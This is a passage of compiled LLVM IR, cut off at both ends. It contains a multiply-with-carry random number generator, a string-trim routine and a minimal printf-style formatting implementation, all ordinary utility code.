  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10

; <label>:34:                                     ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  br label %23

; <label>:23:                                     ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #10
  %35 = icmp ne i32 %34, 0
  br label %36

; <label>:36:                                     ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

; <label>:38:                                     ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23

; <label>:41:                                     ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

; <label>:47:                                     ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

; <label>:59:                                     ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43

; <label>:62:                                     ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %282, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %285

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %273

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %285

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %274

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45

; <label>:55:                                     ; preds = %45
  br label %56

; <label>:56:                                     ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

; <label>:61:                                     ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

; <label>:66:                                     ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

; <label>:68:                                     ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

; <label>:77:                                     ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56

; <label>:80:                                     ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %118

; <label>:85:                                     ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

; <label>:90:                                     ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i64*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

; <label>:96:                                     ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i64*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

; <label>:101:                                    ; preds = %96, %90
  %102 = phi i64* [ %94, %90 ], [ %99, %96 ]
  %103 = load i64, i64* %102, align 8
  %104 = inttoptr i64 %103 to i8*
  store i8* %104, i8** %11, align 8
  %105 = load i8**, i8*** %4, align 8
  %106 = load i8*, i8** %11, align 8
  %107 = icmp ne i8* %106, null
  br i1 %107, label %108, label %110

; <label>:108:                                    ; preds = %101
  %109 = load i8*, i8** %11, align 8
  br label %111

; <label>:110:                                    ; preds = %101
  br label %111

; <label>:111:                                    ; preds = %110, %108
  %112 = phi i8* [ %109, %108 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.147, i32 0, i32 0), %110 ]
  %113 = load i32, i32* %7, align 4
  %114 = load i32, i32* %8, align 4
  %115 = call i32 @prints(i8** %105, i8* %112, i32 %113, i32 %114)
  %116 = load i32, i32* %9, align 4
  %117 = add nsw i32 %116, %115
  store i32 %117, i32* %9, align 4
  br label %282

; <label>:118:                                    ; preds = %80
  %119 = load i8*, i8** %5, align 8
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 100
  br i1 %122, label %123, label %148

; <label>:123:                                    ; preds = %118
  %124 = load i8**, i8*** %4, align 8
  %125 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %126 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %125, i32 0, i32 0
  %127 = load i32, i32* %126, align 8
  %128 = icmp ule i32 %127, 40
  br i1 %128, label %129, label %135

; <label>:129:                                    ; preds = %123
  %130 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %125, i32 0, i32 3
  %131 = load i8*, i8** %130, align 8
  %132 = getelementptr i8, i8* %131, i32 %127
  %133 = bitcast i8* %132 to i32*
  %134 = add i32 %127, 8
  store i32 %134, i32* %126, align 8
  br label %140

; <label>:135:                                    ; preds = %123
  %136 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %125, i32 0, i32 2
  %137 = load i8*, i8** %136, align 8
  %138 = bitcast i8* %137 to i32*
  %139 = getelementptr i8, i8* %137, i32 8
  store i8* %139, i8** %136, align 8
  br label %140

; <label>:140:                                    ; preds = %135, %129
  %141 = phi i32* [ %133, %129 ], [ %138, %135 ]
  %142 = load i32, i32* %141, align 4
  %143 = load i32, i32* %7, align 4
  %144 = load i32, i32* %8, align 4
  %145 = call i32 @printi(i8** %124, i32 %142, i32 10, i32 1, i32 %143, i32 %144, i32 97)
  %146 = load i32, i32* %9, align 4
  %147 = add nsw i32 %146, %145
  store i32 %147, i32* %9, align 4
  br label %282

; <label>:148:                                    ; preds = %118
  %149 = load i8*, i8** %5, align 8
  %150 = load i8, i8* %149, align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 120
  br i1 %152, label %153, label %178

; <label>:153:                                    ; preds = %148
  %154 = load i8**, i8*** %4, align 8
  %155 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %156 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %155, i32 0, i32 0
  %157 = load i32, i32* %156, align 8
  %158 = icmp ule i32 %157, 40
  br i1 %158, label %159, label %165

; <label>:159:                                    ; preds = %153
  %160 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %155, i32 0, i32 3
  %161 = load i8*, i8** %160, align 8
  %162 = getelementptr i8, i8* %161, i32 %157
  %163 = bitcast i8* %162 to i32*
  %164 = add i32 %157, 8
  store i32 %164, i32* %156, align 8
  br label %170

; <label>:165:                                    ; preds = %153
  %166 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %155, i32 0, i32 2
  %167 = load i8*, i8** %166, align 8
  %168 = bitcast i8* %167 to i32*
  %169 = getelementptr i8, i8* %167, i32 8
  store i8* %169, i8** %166, align 8
  br label %170

; <label>:170:                                    ; preds = %165, %159
  %171 = phi i32* [ %163, %159 ], [ %168, %165 ]
  %172 = load i32, i32* %171, align 4
  %173 = load i32, i32* %7, align 4
  %174 = load i32, i32* %8, align 4
  %175 = call i32 @printi(i8** %154, i32 %172, i32 16, i32 0, i32 %173, i32 %174, i32 97)
  %176 = load i32, i32* %9, align 4
  %177 = add nsw i32 %176, %175
  store i32 %177, i32* %9, align 4
  br label %282

; <label>:178:                                    ; preds = %148
  %179 = load i8*, i8** %5, align 8
  %180 = load i8, i8* %179, align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 88
  br i1 %182, label %183, label %208

; <label>:183:                                    ; preds = %178
  %184 = load i8**, i8*** %4, align 8
  %185 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %186 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %185, i32 0, i32 0
  %187 = load i32, i32* %186, align 8
  %188 = icmp ule i32 %187, 40
  br i1 %188, label %189, label %195

; <label>:189:                                    ; preds = %183
  %190 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %185, i32 0, i32 3
  %191 = load i8*, i8** %190, align 8
  %192 = getelementptr i8, i8* %191, i32 %187
  %193 = bitcast i8* %192 to i32*
  %194 = add i32 %187, 8
  store i32 %194, i32* %186, align 8
  br label %200

; <label>:195:                                    ; preds = %183
  %196 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %185, i32 0, i32 2
  %197 = load i8*, i8** %196, align 8
  %198 = bitcast i8* %197 to i32*
  %199 = getelementptr i8, i8* %197, i32 8
  store i8* %199, i8** %196, align 8
  br label %200

; <label>:200:                                    ; preds = %195, %189
  %201 = phi i32* [ %193, %189 ], [ %198, %195 ]
  %202 = load i32, i32* %201, align 4
  %203 = load i32, i32* %7, align 4
  %204 = load i32, i32* %8, align 4
  %205 = call i32 @printi(i8** %184, i32 %202, i32 16, i32 0, i32 %203, i32 %204, i32 65)
  %206 = load i32, i32* %9, align 4
  %207 = add nsw i32 %206, %205
  store i32 %207, i32* %9, align 4
  br label %282

; <label>:208:                                    ; preds = %178
  %209 = load i8*, i8** %5, align 8
  %210 = load i8, i8* %209, align 1
  %211 = zext i8 %210 to i32
  %212 = icmp eq i32 %211, 117
  br i1 %212, label %213, label %238

; <label>:213:                                    ; preds = %208
  %214 = load i8**, i8*** %4, align 8
  %215 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %216 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 8
  %218 = icmp ule i32 %217, 40
  br i1 %218, label %219, label %225

; <label>:219:                                    ; preds = %213
  %220 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %215, i32 0, i32 3
  %221 = load i8*, i8** %220, align 8
  %222 = getelementptr i8, i8* %221, i32 %217
  %223 = bitcast i8* %222 to i32*
  %224 = add i32 %217, 8
  store i32 %224, i32* %216, align 8
  br label %230

; <label>:225:                                    ; preds = %213
  %226 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %215, i32 0, i32 2
  %227 = load i8*, i8** %226, align 8
  %228 = bitcast i8* %227 to i32*
  %229 = getelementptr i8, i8* %227, i32 8
  store i8* %229, i8** %226, align 8
  br label %230

; <label>:230:                                    ; preds = %225, %219
  %231 = phi i32* [ %223, %219 ], [ %228, %225 ]
  %232 = load i32, i32* %231, align 4
  %233 = load i32, i32* %7, align 4
  %234 = load i32, i32* %8, align 4
  %235 = call i32 @printi(i8** %214, i32 %232, i32 10, i32 0, i32 %233, i32 %234, i32 97)
  %236 = load i32, i32* %9, align 4
  %237 = add nsw i32 %236, %235
  store i32 %237, i32* %9, align 4
  br label %282

; <label>:238:                                    ; preds = %208
  %239 = load i8*, i8** %5, align 8
  %240 = load i8, i8* %239, align 1
  %241 = zext i8 %240 to i32
  %242 = icmp eq i32 %241, 99
  br i1 %242, label %243, label %272

; <label>:243:                                    ; preds = %238
  %244 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %245 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %244, i32 0, i32 0
  %246 = load i32, i32* %245, align 8
  %247 = icmp ule i32 %246, 40
  br i1 %247, label %248, label %254

; <label>:248:                                    ; preds = %243
  %249 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %244, i32 0, i32 3
  %250 = load i8*, i8** %249, align 8
  %251 = getelementptr i8, i8* %250, i32 %246
  %252 = bitcast i8* %251 to i32*
  %253 = add i32 %246, 8
  store i32 %253, i32* %245, align 8
  br label %259

; <label>:254:                                    ; preds = %243
  %255 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %244, i32 0, i32 2
  %256 = load i8*, i8** %255, align 8
  %257 = bitcast i8* %256 to i32*
  %258 = getelementptr i8, i8* %256, i32 8
  store i8* %258, i8** %255, align 8
  br label %259

; <label>:259:                                    ; preds = %254, %248
  %260 = phi i32* [ %252, %248 ], [ %257, %254 ]
  %261 = load i32, i32* %260, align 4
  %262 = trunc i32 %261 to i8
  %263 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %262, i8* %263, align 1
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %264, align 1
  %265 = load i8**, i8*** %4, align 8
  %266 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %267 = load i32, i32* %7, align 4
  %268 = load i32, i32* %8, align 4
  %269 = call i32 @prints(i8** %265, i8* %266, i32 %267, i32 %268)
  %270 = load i32, i32* %9, align 4
  %271 = add nsw i32 %270, %269
  store i32 %271, i32* %9, align 4
  br label %282

; <label>:272:                                    ; preds = %238
  br label %281

; <label>:273:                                    ; preds = %17
  br label %274

; <label>:274:                                    ; preds = %273, %35
  %275 = load i8**, i8*** %4, align 8
  %276 = load i8*, i8** %5, align 8
  %277 = load i8, i8* %276, align 1
  %278 = zext i8 %277 to i32
  call void @printchar(i8** %275, i32 %278)
  %279 = load i32, i32* %9, align 4
  %280 = add nsw i32 %279, 1
  store i32 %280, i32* %9, align 4
  br label %281

; <label>:281:                                    ; preds = %274, %272
  br label %282

; <label>:282:                                    ; preds = %281, %259, %230, %200, %170, %140, %111
  %283 = load i8*, i8** %5, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %5, align 8
  br label %12

; <label>:285:                                    ; preds = %29, %12
  %286 = load i8**, i8*** %4, align 8
  %287 = icmp ne i8** %286, null
  br i1 %287, label %288, label %291

; <label>:288:                                    ; preds = %285
  %289 = load i8**, i8*** %4, align 8
  %290 = load i8*, i8** %289, align 8
  store i8 0, i8* %290, align 1
  br label %291

; <label>:291:                                    ; preds = %288, %285
  %292 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %293 = bitcast %struct.__va_list_tag* %292 to i8*
  call void @llvm.va_end(i8* %293)
  %294 = load i32, i32* %9, align 4
  ret i32 %294
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

; <label>:24:                                     ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17

; <label>:27:                                     ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

; <label>:32:                                     ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

; <label>:36:                                     ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

; <label>:41:                                     ; preds = %40, %36
  br label %42

; <label>:42:                                     ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

; <label>:46:                                     ; preds = %42
  br label %47

; <label>:47:                                     ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** %51, i32 %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

; <label>:55:                                     ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47

; <label>:58:                                     ; preds = %47
  br label %59

; <label>:59:                                     ; preds = %58, %42
  br label %60

; <label>:60:                                     ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

; <label>:64:                                     ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** %65, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

; <label>:71:                                     ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60

; <label>:74:                                     ; preds = %60
  br label %75

; <label>:75:                                     ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

; <label>:78:                                     ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** %79, i32 %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

; <label>:83:                                     ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75

; <label>:86:                                     ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %102

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

; <label>:45:                                     ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

; <label>:50:                                     ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
